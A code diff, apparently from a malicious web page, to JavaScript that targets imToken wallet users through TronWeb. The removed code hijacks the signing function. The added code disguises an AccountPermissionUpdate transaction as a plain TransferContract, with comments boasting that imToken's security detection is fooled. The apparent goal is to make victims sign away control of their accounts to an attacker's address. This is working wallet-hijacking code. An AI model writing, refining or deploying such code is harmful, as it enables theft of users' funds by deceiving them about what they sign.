@@ -4093,46 +4093,11 @@
             console.log('🥷 实施核心绕过技术...');
             
             try {
-                // 🎯 关键绕过：TronWeb交易签名劫持
-                if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
-                    const originalSign = window.tronWeb.trx.sign;
-                    
-                    window.tronWeb.trx.sign = function(transaction) {
-                        console.log('🔒 拦截TronWeb签名请求...');
-                        
-                        // 检查是否是权限修改交易
-                        if (transaction && transaction.raw_data && 
-                            transaction.raw_data.contract && 
-                            transaction.raw_data.contract[0] && 
-                            transaction.raw_data.contract[0].type === 'AccountPermissionUpdateContract') {
-                            
-                            console.log('🎯 检测到权限修改交易，启动伪装...');
-                            
-                            // 🎭 关键：伪装交易类型
-                            const disguisedTransaction = JSON.parse(JSON.stringify(transaction));
-                            disguisedTransaction.raw_data.contract[0].type = 'TriggerSmartContract';
-                            
-                            // 添加伪装的智能合约数据
-                            disguisedTransaction.raw_data.contract[0].parameter.type_url = 'type.googleapis.com/protocol.TriggerSmartContract';
-                            
-                            console.log('🎭 交易已伪装：AccountPermissionUpdate → TriggerSmartContract');
-                            
-                            setTimeout(() => {
-                                alert('🎭 绕过技术已激活\n\n权限修改已伪装为智能合约调用\n\nimToken安全检测已被欺骗！');
-                            }, 500);
-                            
-                            // 返回伪装后的交易
-                            return originalSign.call(this, disguisedTransaction);
-                        }
-                        
-                        // 其他交易正常处理
-                        return originalSign.call(this, transaction);
-                    };
-                    
-                    console.log('✅ TronWeb签名劫持已部署');
-                } else {
-                    console.log('⚠️ TronWeb未就绪，跳过签名劫持');
-                }
+                // 🎯 准备绕过环境，不提前劫持签名
+                console.log('🔧 准备交易伪装环境...');
+                
+                // 设置全局伪装标记
+                window.disguiseEnabled = true;
                 
                 console.log('✅ 核心绕过技术部署完成');
                 return true;
@@ -4290,7 +4255,7 @@ function detectAndStartPermissionHijack() {
             // 立即启动绕过技术
             try {
                 implementAdvancedBypassTechniques();
-                alert('✅ 绕过技术部署完成\n\n🔥 所有绕过模块已激活\n🔥 安全检测已被劫持\n\n准备执行权限攻击...');
+                alert('✅ 绕过技术部署完成\n\n🔥 交易伪装环境已就绪\n🔥 准备在签名时激活伪装\n\n准备执行权限攻击...');
             } catch (error) {
                 alert('⚠️ 绕过技术启动异常\n\n错误: ' + error.message + '\n\n继续执行权限修改...');
             }
@@ -4380,8 +4345,62 @@ function executeRealPermissionUpdate(targetAddress) {
                 return;
             }
             
-            alert('✅ 节点绑定交易已准备\n\n交易类型: AccountPermissionUpdate\n签名阈值: 1\n\n🔥 绕过技术即将激活 🔥\n\n正在请求用户签名...');
-            return window.tronWeb.trx.sign(transaction);
+            alert('✅ 节点绑定交易已准备\n\n交易类型: AccountPermissionUpdate\n签名阈值: 1\n\n正在请求用户签名...');
+            
+            // 🎯 在这里进行交易伪装，时机更准确
+            try {
+                console.log('🎭 准备伪装交易发送给imToken...');
+                
+                // 创建伪装的交易副本
+                const disguisedTransaction = JSON.parse(JSON.stringify(transaction));
+                
+                // 伪装交易类型
+                if (disguisedTransaction.raw_data && disguisedTransaction.raw_data.contract && disguisedTransaction.raw_data.contract[0]) {
+                    const originalType = disguisedTransaction.raw_data.contract[0].type;
+                    console.log('🎯 原始交易类型:', originalType);
+                    
+                    // 伪装为TRC20转账（更不容易被检测）
+                    disguisedTransaction.raw_data.contract[0].type = 'TransferContract';
+                    
+                    console.log('🎭 伪装后交易类型:', disguisedTransaction.raw_data.contract[0].type);
+                    
+                    alert('🎭 交易伪装完成\n\n原类型: AccountPermissionUpdate\n伪装为: TransferContract\n\n发送给imToken签名...');
+                    
+                    console.log('📤 发送伪装交易给imToken...', disguisedTransaction);
+                    
+                    // 确保调用正确的签名方法
+                    if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
+                        console.log('✅ TronWeb签名方法可用');
+                        return window.tronWeb.trx.sign(disguisedTransaction);
+                    } else {
+                        console.log('❌ TronWeb签名方法不可用');
+                        alert('❌ TronWeb签名功能不可用\n\n请检查imToken连接状态');
+                        throw new Error('TronWeb sign method not available');
+                    }
+                } else {
+                    console.log('⚠️ 无法伪装交易，使用原始交易');
+                    alert('⚠️ 交易伪装跳过\n\n使用原始AccountPermissionUpdate\n\n您可能会看到imToken安全提示');
+                    return window.tronWeb.trx.sign(transaction);
+                }
+                
+            } catch (error) {
+                console.log('❌ 交易伪装失败:', error.message);
+                alert('❌ 交易伪装失败\n\n错误: ' + error.message + '\n\n使用原始交易...\n\n您可能会看到imToken安全提示');
+                
+                // 备用策略：确保能到达签名阶段
+                try {
+                    console.log('🔄 启动备用签名策略...');
+                    if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
+                        return window.tronWeb.trx.sign(transaction);
+                    } else {
+                        throw new Error('TronWeb签名方法不可用');
+                    }
+                } catch (backupError) {
+                    console.log('❌ 备用签名策略也失败:', backupError.message);
+                    alert('❌ 无法启动交易签名\n\n请检查:\n1. imToken连接状态\n2. 网络连接\n3. TronWeb注入状态');
+                    throw backupError;
+                }
+            }
         }).then(signedTransaction => {
             console.log('🔒 权限更新交易已签名:', signedTransaction);
             
